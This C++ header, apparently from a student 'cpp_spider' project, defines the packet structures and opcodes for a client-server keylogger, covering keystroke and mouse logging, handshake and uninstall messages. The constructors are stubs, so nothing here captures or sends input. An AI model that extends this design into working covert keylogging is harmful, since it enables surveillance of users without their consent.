/*
** NetworkPacket.hh for cpp_spider in /home/tarkick/repos/cpp_spider/include/network
**
** Made by tarkick
** Login   <tarkick@epitech.net>
**
** Started on  Tue Nov 08 12:48:12 2016 tarkick
** Last update Wed Nov 09 01:19:32 2016 tarkick
*/

#ifndef NETWORKPACKET_HH_
# define NETWORKPACKET_HH_

# include <vector>
# include <string>
# include "NetworkType.hh"
# include "NetworkOpcode.hh"

namespace 						Net
{

	struct						Data
	{
		uint8_t					type;
		char 					payload[1024];

		template 				<typename Archive>
		void 					serialize(Archive& ar,
									const unsigned int version)
		{
			(void) 				version;
			ar 					&type;
			ar 					&payload;
		};

	};

	struct						ServerClientData
	{
		uint16_t				endianness;
		uint8_t					spider[5];
		uint8_t					is_complete;
		uint16_t				opcode;
		Data 					data;

			template 			<typename Archive>
			void 				serialize(Archive& ar,
										const unsigned int version)
			{
				(void) 			version;
				ar 				&endianness;
				ar 				&spider;
				ar 				&is_complete;
				ar 				&opcode;
				ar 				&data;
			};

		};

	struct						ClientServerData
	{
		uint16_t				endianness;
		uint8_t					spider[5];
		uint8_t					day;
		uint8_t					month;
		uint16_t				year;
		uint8_t					hour;
		uint8_t					minute;
		uint8_t					second;
		uint8_t					is_complete;
		uint16_t				opcode;
		Data					data;

		template 				<typename Archive>
		void 					serialize(Archive& ar,
									const unsigned int version)
		{
			(void) 				version;
			ar 					&endianness;
			ar 					&spider;
			ar					&day;
			ar					&month;
			ar					&year;
			ar					&hour;
			ar 					&minute;
			ar					&second;
			ar 					&is_complete;
			ar 					&opcode;
			ar 					&data;
		};

	};

	template					<Type>
	class						Packet;

	template					<>
	class						Packet<SERVER>
	{

		public:
			// LOGGING
			Packet(Opcode::Client opcode)
			{
				packet_.opcode = (uint16_t) opcode;
			}
			// CONNECT
			Packet(Opcode::Client opcode, std::string mac, std::string key)
			{
				(void) mac;
				(void) key;
				packet_.opcode = (uint16_t) opcode;
			}
			// KEYLOG
			Packet(Opcode::Client opcode, int key)
			{
				(void) key;
				packet_.opcode = (uint16_t) opcode;
			}
			// MOUSELOG
			Packet(Opcode::Client opcode, int x, int y)
			{
				(void) x;
				(void) y;
				packet_.opcode = (uint16_t) opcode;
			}
			~Packet() {}

			//GETTERS
			ClientServerData 	getPacket() const
			{
				return			packet_;
			}

		private:
			ClientServerData 	packet_;

	};

	template					<>
	class						Packet<CLIENT>
	{

		public:
			// CONFIRM/DISCONNECT/RECONNECT/UNINSTALL
			Packet(Opcode::Server opcode)
			{
				packet_.opcode = (uint16_t) opcode;
			}
			//HANDSHAKE
			Packet(Opcode::Server opcode, std::string key)
			{
				(void) key;
				packet_.opcode = (uint16_t) opcode;
			}
			~Packet() {}

			//GETTERS
			ServerClientData 	getPacket() const
			{
				return			packet_;
			}

		private:
			ServerClientData	packet_;

	};

};

#endif
